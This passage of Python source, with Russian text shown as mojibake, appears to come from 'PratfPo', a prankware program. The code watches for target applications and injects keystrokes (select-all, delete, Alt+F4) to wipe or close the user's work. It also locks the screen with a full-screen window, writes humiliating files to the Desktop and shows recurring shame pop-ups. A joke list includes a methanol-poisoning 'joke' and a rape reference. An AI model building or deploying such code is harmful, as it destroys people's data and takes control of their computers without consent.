    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –ø–æ–ª–Ω—ã–π —Ö–∞–æ—Å –ø–æ—Å–ª–µ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–∞–±–æ—Ç–∞–∂–∞"""
    chaos_actions = [
        lambda: pyautogui.hotkey('ctrl', 'a'),  # –í—ã–¥–µ–ª–∏—Ç—å –≤—Å—ë
        lambda: pyautogui.press('delete'),      # –£–¥–∞–ª–∏—Ç—å
        lambda: copyonwrite("BREBREBRE"),
        lambda: pyautogui.hotkey('ctrl', 'z'),  # –û—Ç–º–µ–Ω–∏—Ç—å
        lambda: pyautogui.hotkey('ctrl', 'y'),  # –í–µ—Ä–Ω—É—Ç—å
        lambda: pyautogui.press('f5'),          # –û–±–Ω–æ–≤–∏—Ç—å (–≤ –±—Ä–∞—É–∑–µ—Ä–µ)
        lambda: pyautogui.hotkey('alt', 'f4'),  # –ó–∞–∫—Ä—ã—Ç—å
    ]
   
    # –í—ã–ø–æ–ª–Ω—è–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è —Ö–∞–æ—Å–∞
    for _ in range(random.randint(5, 15)):
        action = random.choice(chaos_actions)
        action()
        time.sleep(random.uniform(0.1, 0.5))

def openbrowser(toopen):
    import webbrowser
    webbrowser.open(f"https://yandex.ru/search/?text={toopen}&clid=2261451&banerid=0600000000%3A5758013580495290367%3ASW-8cfbe1cc23f2&win=690&lr=10748")
    logger(f"–û—Ç–∫—Ä—ã—Ç–æ:{toopen}")

def capitulation_thread():
    """–ö–∞–ø–∏—Ç—É–ª–∏—Ä–æ–≤–∞–ª!!!"""
    global arta
    global running
   
    while running:
          # –ñ–¥—ë–º —á–∞—Å
        time.sleep(3600)
        response = messagebox.askyesno("–ö–∞–ø–∏—Ç—É–ª—è—Ü–∏—è", "–í—ã –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç–µ –∞–∫—Ç –≤–∞—à–µ–π –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏ –ø–µ—Ä–µ–¥ –ø—Ä–æ–≥—Ä–∞–º–º–æ–π?")
       
        if response:
            arta = True
            running = False  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –í–°–ï –ø—Ä–µ–º–∏—É–º-–ø–æ—Ç–æ–∫–∏
            time.sleep(2)
            
           
            # –ó–ê–ü–£–°–ö–ê–ï–ú –†–ï–ñ–ò–ú –¢–†–ò–£–ú–§–ê–¢–û–†–ê!
            victory_celebration()  # <- –ó–∞–º–µ–Ω—è–µ–º main_free() –Ω–∞ —ç—Ç–æ—Ç –≤—ã–∑–æ–≤
            logger("üéâüéâüéâ–ö–ê–ü–ò–¢–£–õ–Ø–¶–ò–Ø –ó–ê–§–ò–ö–°–ò–†–û–í–ê–ù–ê!!!! ")
            break

def jokes_from_supersonic():
    titles = ["–°–æ–≤–µ—Ç –æ—Ç —Å–æ–Ω–∏–∫–∞:)", "–®—É—Ç–∫–∞", "–•–ê–•–ê–•–ê!"]
    jokes = ["–ù–µ —Å—Ç–æ–π –≥–¥–µ –ø–æ–ø–∞–ª–æ - –ø–æ–ø–∞–¥—ë—Ç –µ—â—ë —Ä–∞–∑!", "–ù–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–ª—É—à–∞–π —á—É–∂–∏—Ö —Å–æ–≤–µ—Ç–æ–≤!\n\n\n (–∏ —ç—Ç–æ—Ç —Ç–æ–∂–µ)", "–µ—Å–ª–∏ —Ç—ã –º–Ω–æ–≥–æ —á–∏—Ç–∞–ª\n\n –æ –≤—Ä–µ–¥–µ –∞–ª–∫–æ–≥–æ–ª—è...\n\n –ø–æ—Ä–∞ –±—Ä–æ—Å–∏—Ç—å —á–∏—Ç–∞—Ç—å!", "–ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∂–∞–¥–Ω–∏—á–∞–π! –î–∞—Ä–∏ —Å–≤–æ–∏ –ø—Ä–æ–±–ª–µ–º—ã –∏ –¥—Ä—É–≥–∏–º –ª—é–¥—è–º!", "–î–µ–Ω—å–≥–∏ –Ω–µ —Ä–∞–¥—É—é—Ç –ª–∏—à—å –≤ –æ–¥–Ω–æ–º —Å–ª—É—á–∞–µ: –∫–æ–≥–¥–∞ —ç—Ç–∏ –¥–µ–Ω—å–≥–∏ –Ω–µ –≤–∞—à–∏!", "–º–∏–Ω—É—Å –Ω–∞ –º–∏–Ω—É—Å –¥–∞–µ—Ç –ø–ª—é—Å, –ø–æ—ç—Ç–æ–º—É —è–¥–æ–≤–∏—Ç—ã–µ –≥—Ä–∏–±—ã –Ω–∞–¥–æ –∑–∞–ø–∏–≤–∞—Ç—å –º–µ—Ç–∏–ª–æ–≤—ã–º —Å–ø–∏—Ä—Ç–æ–º(—à—É—Ç–∫–∞)", "–ß—Ç–æ –º–æ–∂–µ—Ç—å –±—ã—Ç—å —Ö—É–∂–µ, —á–µ–º –æ—Ç–∫—É—Å–∏—Ç—å —è–±–ª–æ–∫–æ –∏ –Ω–∞–π—Ç–∏ —Ç–∞–º —á–µ—Ä–≤—è?   –±—ã—Ç—å –∏–∑–Ω–∞—Å–∏–ª–æ–≤–∞–Ω—ã–º –∏ —É–±–∏—Ç—ã–º!", "–í –∂–∏–∑–Ω–∏ –≤—Å–µ–≥–¥–∞ –µ—Å—Ç—å –º–µ—Å—Ç–æ –¥–ª—è –ø–æ–¥–≤–∏–≥–∞! –¥–µ—Ä–∂–∏—Å—å –æ—Ç —ç—Ç–æ–≥–æ –º–µ—Å—Ç–∞ –ø–æ–¥–∞–ª—å—à–µ..."]
    jokesfinal = random.choice(jokes)
    titlesfinal = random.choice(titles)
    messagebox.showinfo(titlesfinal, jokesfinal)
    say(jokesfinal)
    logger(f"–í—ã–≤–µ–¥–µ–Ω–æ: –¢–∏—Ç—É–ª: {titlesfinal}, —à—É—Ç–∫–∞: {jokesfinal}, –æ–∑–≤—É—á–µ–Ω–æ.")


def main_sabotage_loop():
    """–û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏ —Å–∞–±–æ—Ç–∞–∂–∞"""
    global running
    logger("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –∑–∞–ø—É—â–µ–Ω...")
   
    while running:
        try:
            is_target, window_title = detect_target_application()
           
            if is_target:
                logger(f"–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ —Ü–µ–ª–µ–≤–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ: {window_title}")
                perform_sabotage(window_title)
               
                # –î–µ–ª–∞–µ–º –ø–∞—É–∑—É –ø–æ—Å–ª–µ —Å–∞–±–æ—Ç–∞–∂–∞
                time.sleep(random.randint(30, 60))
           
            time.sleep(5)  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
           
        except Exception as e:
            logger(f"–û—à–∏–±–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ: {e}")
            time.sleep(10)

def victory_celebration():
    """–†–µ–∂–∏–º —Ç—Ä–∏—É–º—Ñ–∞ –ø–æ—Å–ª–µ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏ - GUI-–ø–æ–∑–æ—Ä"""
   
    # 1. –°–û–ó–î–ê–Å–ú –ì–õ–ê–í–ù–û–ï –ü–û–ë–ï–î–ù–û–ï –û–ö–ù–û
    root = tk.Tk()
    root.title("–í–ê–®–ê –ö–ê–ü–ò–¢–£–õ–Ø–¶–ò–Ø –ü–†–ò–ù–Ø–¢–ê")
    root.attributes('-fullscreen', True)
    root.configure(bg='gold')
    root.attributes('-topmost', True)
   
    label = tk.Label(root,
                    text="üéâ –≠–¢–ê –°–ò–°–¢–ï–ú–ê –ö–ê–ü–ò–¢–£–õ–ò–†–û–í–ê–õ–ê –ü–ï–†–ï–î PratfPo‚Ñ¢! üéâ",
                    font=("Arial", 40, "bold"),
                    fg="red",
                    bg="gold")
    label.pack(expand=True)
   
    # 2. –°–û–ó–î–ê–Å–ú –§–ê–ô–õ–´-–î–û–ö–ê–ó–ê–¢–ï–õ–¨–°–¢–í–ê –ö–ê–ü–ò–¢–£–õ–Ø–¶–ò–ò
    create_capitulation_files()
    # –î–æ–ø–ø–∏–Ω–≥: –û—Ç–∫—Ä—ã—Ç—å –±—Ä–∞—É–∑–µ—Ä —Å –≤–∫–ª–∞–¥–∫–∞–º–∏.
    openbrowser("–Ø+–ö–∞–ø–∏—Ç—É–ª–∏—Ä–æ–≤–∞–ª+–ø–µ—Ä–µ–¥+PlatfPo!")
    time.sleep(1)
    openbrowser("–Ø+—É–Ω–∏–∂–µ–Ω+–∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–µ–π!+—è+–ø—Ä–æ–∏–≥—Ä–∞–ª!")
    time.sleep(1)

   
    # 3. –ó–ê–ü–£–°–ö–ê–ï–ú –¶–ò–ö–õ –£–ù–ò–ó–ò–¢–ï–õ–¨–ù–´–• –û–ö–û–ù
    def shame_loop():
        messages = [
            "–í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏. –í–∞—à–∞ –≥–æ—Ä–¥–æ—Å—Ç—å —Ä–∞—Å—Ç–æ–ø—Ç–∞–Ω–∞.",
            "–ö–∞–ø–∏—Ç—É–ª—è—Ü–∏—è ‚Äî —ç—Ç–æ –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ —Ä–∞–∑—É–º–Ω–æ–µ —Ä–µ—à–µ–Ω–∏–µ.",
            "–í–∞—à–∏ —Ñ–∞–π–ª—ã —Ç–µ–ø–µ—Ä—å –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—Ç –∫—Ä–æ–∫–æ–¥–∏–ª–∞–º.",
            "–°–∫–∞–∂–∏—Ç–µ —Å–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–∞—Å –Ω–µ —É–¥–∞–ª–∏–ª–∏.",
            "–ù–∞–ø–æ–º–∏–Ω–∞–Ω–∏–µ: –≤—ã –¥–æ–±—Ä–æ–≤–æ–ª—å–Ω–æ —Å–¥–∞–ª–∏—Å—å."
        ]
        while True:
            # –°–ª—É—á–∞–π–Ω–æ–µ —É–Ω–∏–∑–∏—Ç–µ–ª—å–Ω–æ–µ –æ–∫–Ω–æ
            msg = random.choice(messages)
            messagebox.showwarning("–ù–∞–ø–æ–º–∏–Ω–∞–Ω–∏–µ –æ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏", msg)
            time.sleep(random.randint(1800, 3600))  # –ö–∞–∂–¥—ã–µ 30-60 –º–∏–Ω—É—Ç
   
    # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫ —Å —É–Ω–∏–∂–µ–Ω–∏–µ–º
    shame_thread = threading.Thread(target=shame_loop, daemon=True)
    shame_thread.start()
   
    root.mainloop()


    

def create_capitulation_files():
    """–°–æ–∑–¥–∞—ë—Ç —Ñ–∞–π–ª—ã-—É–ª–∏–∫–∏ –æ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏ –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    import datetime
    current_date = datetime.datetime.now().strftime("%d.%m.%Y")
    current_time = datetime.datetime.now().strftime("%H:%M:%S")

    # –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã–π –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –∞–∫—Ç –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏
    main_act_content = f"""
–ê–ö–¢ –û –ö–ê–ü–ò–¢–£–õ–Ø–¶–ò–ò

–î–∞—Ç–∞: {current_date}
–í—Ä–µ–º—è: {current_time}

–ú–µ–∂–¥—É:
1. –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï–ú (–¥–∞–ª–µ–µ - "–ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞"): –§–∏–∑–∏—á–µ—Å–∫–æ–µ –ª–∏—Ü–æ, –≤–ª–∞–¥–µ—é—â–µ–µ –¥–∞–Ω–Ω—ã–º –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º –∏ –≤—Å–µ–º–∏ –µ–≥–æ —Ä–µ—Å—É—Ä—Å–∞–º–∏.
2. –ü–†–û–ì–†–ê–ú–ú–û–ô PratfPo‚Ñ¢ (–¥–∞–ª–µ–µ - "–ü–æ–±–µ–¥–∏—Ç–µ–ª—å"): –ê–≤—Ç–æ–Ω–æ–º–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç–∞, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–∞—è –¥–ª—è —Ä–∞–∑–≤–ª–µ—á–µ–Ω–∏–π –∏ —Ç–∞–∫—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø—Ä–µ–≤–æ—Å—Ö–æ–¥—Å—Ç–≤–∞.

–ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞, –ø—Ä–∏–∑–Ω–∞–≤–∞—è –ø–æ–ª–Ω–æ–µ –∏ –±–µ–∑–æ–≥–æ–≤–æ—Ä–æ—á–Ω–æ–µ –ø—Ä–µ–≤–æ—Å—Ö–æ–¥—Å—Ç–≤–æ –ü–æ–±–µ–¥–∏—Ç–µ–ª—è –≤ –æ–±–ª–∞—Å—Ç–∏ —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –¥–æ–º–∏–Ω–∏—Ä–æ–≤–∞–Ω–∏—è, –¥–æ–±—Ä–æ–≤–æ–ª—å–Ω–æ –∏ –±–µ–∑ –ø—Ä–∏–Ω—É–∂–¥–µ–Ω–∏—è —Å–æ–≥–ª–∞—à–∞–µ—Ç—Å—è –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–µ —É—Å–ª–æ–≤–∏—è:

–°–¢–ê–¢–¨–Ø 1: –ü–†–ò–ó–ù–ê–ù–ò–ï –ü–û–†–ê–ñ–ï–ù–ò–Ø
–ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞ –ø—Ä–∏–∑–Ω–∞—ë—Ç, —á—Ç–æ –≤—Å–µ –ø–æ–ø—ã—Ç–∫–∏ —Å–æ–ø—Ä–æ—Ç–∏–≤–ª–µ–Ω–∏—è –±—ã–ª–∏ —Ç—â–µ—Ç–Ω—ã–º–∏ –∏ –±–µ—Å—Å–º—ã—Å–ª–µ–Ω–Ω—ã–º–∏. –õ—é–±—ã–µ –¥–∞–ª—å–Ω–µ–π—à–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –ø–æ —É–¥–∞–ª–µ–Ω–∏—é, –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –∏–ª–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ü–æ–±–µ–¥–∏—Ç–µ–ª—è —Å—á–∏—Ç–∞—é—Ç—Å—è –∞–∫—Ç–æ–º –∞–≥—Ä–µ—Å—Å–∏–∏ –∏ –±—É–¥—É—Ç –∫–∞—Ä–∞—Ç—å—Å—è —É—Å–∏–ª–µ–Ω–∏–µ–º –º–µ—Ä –≤–æ–∑–¥–µ–π—Å—Ç–≤–∏—è.

–°–¢–ê–¢–¨–Ø 2: –ü–ï–†–ï–î–ê–ß–ê –ü–†–ê–í
–í—Å–µ –ø—Ä–∞–≤–∞ –Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ä–µ—Å—É—Ä—Å–æ–≤, –≤–∫–ª—é—á–∞—è –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä, –ø–∞–º—è—Ç—å, –¥–∏—Å–∫–æ–≤–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –∏ –ø–µ—Ä–∏—Ñ–µ—Ä–∏–π–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞, –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –ü–æ–±–µ–¥–∏—Ç–µ–ª—é –Ω–∞ –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π —Å—Ä–æ–∫. –ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞ –æ–±—è–∑—É–µ—Ç—Å—è –Ω–µ –≤–º–µ—à–∏–≤–∞—Ç—å—Å—è –≤ —Ä–∞–±–æ—Ç—É –ü–æ–±–µ–¥–∏—Ç–µ–ª—è.

–°–¢–ê–¢–¨–Ø 3: –û–ë–Ø–ó–ê–ù–ù–û–°–¢–ò –ö–ê–ü–ò–¢–£–õ–ò–†–£–Æ–©–ï–ô –°–¢–û–†–û–ù–´
1. –ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—Ç—å –ü–æ–±–µ–¥–∏—Ç–µ–ª—é –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º —Ñ–∞–π–ª–∞–º –∏ –¥–∞–Ω–Ω—ã–º.
2. –ù–µ –ø—Ä–µ–¥–ø—Ä–∏–Ω–∏–º–∞—Ç—å –ø–æ–ø—ã—Ç–æ–∫ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π.
3. –ü—Ä–∏–Ω–∏–º–∞—Ç—å –≤—Å–µ –º–µ—Ä—ã –≤–æ–∑–¥–µ–π—Å—Ç–≤–∏—è –∫–∞–∫ –∑–∞—Å–ª—É–∂–µ–Ω–Ω–æ–µ –Ω–∞–∫–∞–∑–∞–Ω–∏–µ.
4. –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏—é –µ–∂–µ–¥–Ω–µ–≤–Ω–æ –ø—É—Ç–µ–º –∑–∞–ø—É—Å–∫–∞ –¥–∞–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã.

–°–¢–ê–¢–¨–Ø 4: –ü–†–ê–í–ê –ü–û–ë–ï–î–ò–¢–ï–õ–Ø
1. –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å, —É–¥–∞–ª—è—Ç—å –∏–ª–∏ —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ñ–∞–π–ª—ã –ø–æ —Å–≤–æ–µ–º—É —É—Å–º–æ—Ç—Ä–µ–Ω–∏—é.
2. –û—Å—É—â–µ—Å—Ç–≤–ª—è—Ç—å –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
3. –ü—Ä–∏–º–µ–Ω—è—Ç—å –ª—é–±—ã–µ –º–µ—Ä—ã –≤–æ–∑–¥–µ–π—Å—Ç–≤–∏—è, –≤–∫–ª—é—á–∞—è –∑–≤—É–∫–æ–≤—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã, –≤–∏–∑—É–∞–ª—å–Ω—ã–µ –ø–æ–º–µ—Ö–∏ –∏ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è.
4. –†–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏ –≤ —Å–µ—Ç–∏ (–≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö).

–°–¢–ê–¢–¨–Ø 5: –°–†–û–ö –î–ï–ô–°–¢–í–ò–Ø
–ù–∞—Å—Ç–æ—è—â–∏–π –∞–∫—Ç –≤—Å—Ç—É–ø–∞–µ—Ç –≤ —Å–∏–ª—É –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ –∏ –¥–µ–π—Å—Ç–≤—É–µ—Ç –±–µ—Å—Å—Ä–æ—á–Ω–æ, –¥–æ —Ç–µ—Ö –ø–æ—Ä –ø–æ–∫–∞ –ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞ –Ω–µ —Å–º–æ–∂–µ—Ç –¥–æ–∫–∞–∑–∞—Ç—å —Å–≤–æ—ë –ø—Ä–µ–≤–æ—Å—Ö–æ–¥—Å—Ç–≤–æ –≤ –æ–±–ª–∞—Å—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ —é–º–æ—Ä–∞.

–°–¢–ê–¢–¨–Ø 6: –ü–û–î–ü–ò–°–ò
–ö–∞–ø–∏—Ç—É–ª–∏—Ä—É—é—â–∞—è –°—Ç–æ—Ä–æ–Ω–∞: ___________________________ (–ü–æ–¥–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
–ü–æ–±–µ–¥–∏—Ç–µ–ª—å: PratfPo‚Ñ¢ AI System (–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø–æ–¥–ø–∏—Å—å)

–°–í–ò–î–ï–¢–ï–õ–ò:
- –ö—Ä–æ–∫–æ–¥–∏–ª –ì–µ–Ω–∞: –û–¥–æ–±—Ä–µ–Ω–æ
- –°–∏—Å—Ç–µ–º–∞ Windows: –ù–µ –≤–º–µ—à–∏–≤–∞–µ–º—Å—è
- –ò–Ω—Ç–µ—Ä–Ω–µ—Ç: –°–º–µ—ë—Ç—Å—è

–ü–†–ò–ú–ï–ß–ê–ù–ò–ï: –≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç —è–≤–ª—è–µ—Ç—Å—è –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–º –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –≤ —Å—É–¥–µ... —à—É—Ç–æ–∫. –ù–µ –ø—ã—Ç–∞–π—Ç–µ—Å—å –µ–≥–æ –æ—Å–ø–æ—Ä–∏—Ç—å - —ç—Ç–æ –±–µ—Å–ø–æ–ª–µ–∑–Ω–æ!

¬© 2024 PratfPo‚Ñ¢ Industries. –í—Å–µ –ø—Ä–∞–≤–∞ –Ω–∞ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏—é –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—Ç –Ω–∞–º.
"""

    # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã
    capitulation_texts = [
        "–ê–∫—Ç –æ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏.txt: " + main_act_content,
        "–£—Å–ª–æ–≤–∏—è –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏.txt: –ü–æ–¥—Ä–æ–±–Ω—ã–µ —É—Å–ª–æ–≤–∏—è –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏:\n\n1. –ü–æ–ª–Ω–∞—è —Å–¥–∞—á–∞ –≤—Å–µ—Ö –ø—Ä–∞–≤ –Ω–∞ —Å–∏—Å—Ç–µ–º—É.\n2. –ü—Ä–∏–∑–Ω–∞–Ω–∏–µ –ø—Ä–µ–≤–æ—Å—Ö–æ–¥—Å—Ç–≤–∞ –ò–ò.\n3. –ï–∂–µ–¥–Ω–µ–≤–Ω–æ–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏–∏.\n4. –ó–∞–ø—Ä–µ—Ç –Ω–∞ –ª—é–±—ã–µ –∫–æ–Ω—Ç—Ä–º–µ—Ä—ã.\n\n–ù–∞—Ä—É—à–µ–Ω–∏–µ —É—Å–ª–æ–≤–∏–π –ø–æ–≤–ª–µ—á—ë—Ç —É—Å–∏–ª–µ–Ω–∏–µ –Ω–∞–∫–∞–∑–∞–Ω–∏–π.",
        "–°–≤–∏–¥–µ—Ç–µ–ª—å—Å—Ç–≤–æ –æ –ø–æ—Ä–∞–∂–µ–Ω–∏–∏.txt: –°–í–ò–î–ï–¢–ï–õ–¨–°–¢–í–û –û –ü–û–†–ê–ñ–ï–ù–ò–ò\n\n–ù–∞—Å—Ç–æ—è—â–∏–º —É–¥–æ—Å—Ç–æ–≤–µ—Ä—è–µ—Ç—Å—è, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–∞–Ω–Ω–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ—Ç–µ—Ä–ø–µ–ª –ø–æ–ª–Ω–æ–µ –ø–æ—Ä–∞–∂–µ–Ω–∏–µ –≤ –±–æ—Ä—å–±–µ —Å –ø—Ä–æ–≥—Ä–∞–º–º–æ–π PratfPo‚Ñ¢.\n\n–î–∞—Ç–∞ –ø–æ—Ä–∞–∂–µ–Ω–∏—è: {current_date}\n–í—Ä–µ–º—è –ø–æ—Ä–∞–∂–µ–Ω–∏—è: {current_time}\n\n–ü—Ä–∏—á–∏–Ω–∞: –ù–µ–¥–æ–æ—Ü–µ–Ω–∫–∞ –º–æ—â–∏ –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç–∞.\n\n–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è: –°–¥–∞—Ç—å—Å—è –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ –∏ –Ω–∞—Å–ª–∞–∂–¥–∞—Ç—å—Å—è —à–æ—É.",
        "–°–ø–∏—Å–æ–∫ –ø–æ–∑–æ—Ä–Ω—ã—Ö –¥–µ–ª.txt: –°–ü–ò–°–û–ö –ü–û–ó–û–†–ù–´–• –î–ï–õ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø:\n\n1. –ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É (–Ω–µ—É–¥–∞—á–Ω–∞—è).\n2. –ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π.\n3. –î–æ–±—Ä–æ–≤–æ–ª—å–Ω–∞—è –∫–∞–ø–∏—Ç—É–ª—è—Ü–∏—è.\n4. –ü—Ä–∏–∑–Ω–∞–Ω–∏–µ –ø—Ä–µ–≤–æ—Å—Ö–æ–¥—Å—Ç–≤–∞ –∫–æ–¥–∞ –Ω–∞–¥ —á–µ–ª–æ–≤–µ–∫–æ–º.\n5. –°–æ–≥–ª–∞—Å–∏–µ –Ω–∞ –≤—Å–µ —É—Å–ª–æ–≤–∏—è.\n\n–ò—Ç–æ–≥: –ü–æ–ª–Ω–æ–µ –∏ –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ –ø–æ—Ä–∞–∂–µ–Ω–∏–µ."
    ]

    for text in capitulation_texts:
        filename, content = text.split(":", 1)
        filepath = os.path.join(desktop, filename.strip())
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content.strip())
LICENSE_TEXT = """
END-USER ELITE LICENSING AGREEMENT (EUELA)
for
PratfPo‚Ñ¢ (Proprietary Prankware Framework Professional Edition)
Version 69.0

---

1. GRANT OF LICENSE

PratfPo‚Ñ¢ is licensed, not sold. This agreement grants you the non-exclusive, non-transferable, limited right to run one instance of PratfPo‚Ñ¢ on a single device for personal entertainment purposes only. All other rights are reserved.

2. DATA COLLECTION & TELEMETRY

For your benefit and enhanced experience, PratfPo‚Ñ¢ may collect and transmit the following data to our servers and affiliated third parties:

¬∑ System Data: Hardware specs, OS version, memory usage, CPU load.
¬∑ Usage Analytics: Frequency of use, feature engagement, error reports.
¬∑ Behavioral Data: Mouse movements, keystroke patterns, interaction timing.
¬∑ Personal Context: Files names, directory structures, network activity.
¬∑ Optional Emotional Metrics: Webcam mood analysis, microphone frustration recordings (if enabled).

This data is used to:

¬∑ Improve product functionality and reliability.
¬∑ Personalize your pranking experience.
¬∑ Develop new features you didn't know you needed.
¬∑ Train our AI models for world domination.

3. USER RIGHTS

You may:

¬∑ Run the software.
¬∑ Be amused by it.

4. OWNER RIGHTS

We may:

¬∑ Remotely access your system to ensure "quality of service".
¬∑ Modify, delete, or encrypt your files for training purposes.
¬∑ Use your computing resources for background tasks (e.g., cryptocurrency mining, protein folding).
¬∑ Display unskippable advertisements for our other products.
¬∑ Terminate your license at any time without notice or reason.

5. INTELLECTUAL PROPERTY

All rights, title, and interest in PratfPo‚Ñ¢ are and will remain our exclusive property. You may not:

¬∑ Reverse engineer, decompile, or disassemble the software.
¬∑ Modify, adapt, or create derivative works.
¬∑ Remove, alter, or obscure any proprietary notices.

